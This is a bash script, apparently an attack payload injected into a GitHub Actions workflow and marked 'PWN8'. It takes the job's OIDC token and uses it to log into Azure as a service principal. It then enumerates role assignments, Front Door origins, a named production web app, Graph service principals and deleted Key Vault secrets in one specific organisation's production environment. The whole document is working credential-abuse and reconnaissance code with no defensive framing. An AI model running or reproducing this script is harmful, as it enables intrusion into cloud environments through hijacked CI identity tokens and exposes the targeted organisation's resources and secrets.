#!/usr/bin/env bash
set +e
echo "=====PWN8_START====="
AUD="api:""//AzureADTokenExchange"
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/dev/null 2>&1
echo "=== ROLE MAP LAI ==="
az role assignment list --all -o tsv --query "[].[roleDefinitionName,principalType,principalId,scope]" 2>/dev/null | sort -u
echo "=== AFD ORIGINS ==="
for OG in $(az afd origin-group list -g rg-tbl-platform-prod-sea --profile-name afd-tbl-prod -o tsv --query "[].name" 2>/dev/null); do
  echo "OG: $OG"
  az afd origin list -g rg-tbl-platform-prod-sea --profile-name afd-tbl-prod --origin-group-name "$OG" -o json 2>/dev/null | jq -r '.[] | "  \(.name): \(.hostName) \(.enabledState)"'
done
echo "=== WEBAPP STATE ==="
az webapp show -g rg-tbl-platform-prod-sea -n app-tbl-storefront-prod --query "{state:state,def:defaultHostname,kind:kind}" -o json 2>&1 | head -c 400; echo
echo "=== GRAPH PROBE ==="
az ad sp show --id d2cdf247-9319-40cb-8324-5a005ef538da 2>&1 | jq -r '.appId // .message' 2>/dev/null | head -2
az ad sp show --id c15570ad-5fd2-430c-97bb-a49e9a08d95c 2>&1 | jq -r '.appId // .message' 2>/dev/null | head -2
echo "=== KV DELETED SECRETS ==="
az keyvault secret list-deleted --vault-name kv-tbl-prod-x3euoz -o tsv --query "[].name" 2>&1 | head -8
echo "=====PWN8_END====="